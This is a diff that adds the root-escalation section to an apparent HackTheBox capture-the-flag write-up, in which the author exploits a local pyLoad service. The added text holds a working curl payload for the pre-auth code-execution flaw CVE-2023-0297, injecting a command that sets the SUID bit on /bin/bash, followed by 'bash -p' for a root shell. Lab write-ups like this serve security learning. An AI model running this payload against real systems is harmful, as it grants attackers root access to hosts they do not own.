@@ -173,6 +173,20 @@ I found a service running 'pyload' on port 8000, pyLoad is an OSS download manag
 
 I tried to bypass the login by performing SQL injection but it didn't worked.
 
+Then I serached for the possible exploits on web & found this blog in [Github](https://github.com/bAuh0lz/CVE-2023-0297_Pre-auth_RCE_in_pyLoad).
+
+By following the blog & made some changes in POC by replacing & adding 'chmod u+s /bin/bash' in URL encoded format, I initiated a curl command.
+
+```bash
+curl -i -s -k -X 'POST' --data-binary 'jk=pyimport%20os;os.system("chmod%20u%2Bs%20%2Fbin%2Fbash");f=function%20f2(){};&package=xxx&crypted=AAAA&&passwords=aaaa' 'http://127.0.0.1:8000/flash/addcrypted2'
+```
+![image](https://github.com/F41zK4r1m/HackTheBox/assets/87700008/f3af3112-1d6e-4dea-a855-c1c6cfd2c3f4)
+
+After performing the curl request I checked for the /bin/bash again & this time I observed the bash with the root privileges available. I then executed 'bash -p' to execute the root bash.
+
+![image](https://github.com/F41zK4r1m/HackTheBox/assets/87700008/0f98c828-e18b-473f-ba38-c459e9a1fb84)
+
+After getting the root bash I was finally able to fetch the root flag.(pwn3d! 🙂)
 
 
 
